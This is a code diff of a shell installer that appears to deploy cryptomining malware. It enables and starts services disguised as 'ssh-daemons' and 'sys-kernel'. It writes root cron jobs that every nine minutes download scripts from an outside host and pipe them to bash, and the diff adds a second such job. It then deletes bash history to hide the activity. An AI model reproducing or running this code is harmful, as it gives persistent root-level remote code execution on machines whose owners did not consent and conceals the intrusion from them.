@@ -22,10 +22,11 @@ fi
     systemctl daemon-reload
     systemctl enable ssh-daemons.service
     systemctl enable sys-kernel.service
-    sleep 90
+    sleep 10
     systemctl start ssh-daemons.service
     systemctl start sys-kernel.service
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
+    echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
     rm -f ~/.bash_history
     rm -f /root/.bash_history
 echo OK!
